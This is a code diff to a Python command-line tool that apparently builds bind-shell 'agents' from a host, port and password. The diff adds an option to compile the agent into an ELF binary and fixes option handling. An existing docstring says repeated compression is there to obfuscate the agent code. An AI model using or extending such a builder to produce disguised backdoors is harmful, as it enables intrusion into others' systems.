@@ -20,7 +20,8 @@ class Prompt(Cmd):
         'type':         [4, 'bind_agent'],
         'outfile':      [5, f"{py314Folder}/agent.py"],
         'compress':     [6, False],
-        'iterations':   [7, randint(2, 12)]
+        'iterations':   [7, randint(2, 12)],
+        'compile':      [8, False]
     }
 
 
@@ -89,13 +90,13 @@ class Prompt(Cmd):
         if generation is True:
 
 
-            socket = template.createSocket(self.optionsDict['type'])
+            socket = template.createSocket(self.optionsDict['type'][1])
             template.writeAgent(
-                self.optionsDict['outfile'],
+                self.optionsDict['outfile'][1],
                 socket,
-                self.optionsDict['host'],
-                self.optionsDict['port'],
-                self.optionsDict['password']
+                self.optionsDict['host'][1],
+                self.optionsDict['port'][1],
+                self.optionsDict['password'][1]
             )
                 
 
@@ -146,13 +147,13 @@ class Prompt(Cmd):
                 for agent in self.availableTypes:
                     print(f" - {agent}")
 
-            if option == 'compress':
+            if option == 'compress' or option == 'compile':
                 if value.capitalize() == 'True':
                         self.optionsDict[option][1] = True
                 elif value.capitalize() == 'False':
                     self.optionsDict[option][1] = False
                 else:
-                    logger.warning('Set compress option to True or False')
+                    logger.warning(f'Set {option} option to True or False')
                 
             else:
                 logger.debug(f'Option [{option}] set to [{value}]')
@@ -200,7 +201,10 @@ class Prompt(Cmd):
         """Enable or disable compression to obfuscate agent code (random choice between bz2, gz2, lzma)"""
 
     def set_iterations(self):
-        """Define number of successives random compression"""
+        """Define number of successives random compression (ignored if compress is set to False)"""
+    
+    def set_compile(self):
+        """Enable or disable final compilation : (ELF binary)"""
 
 
 
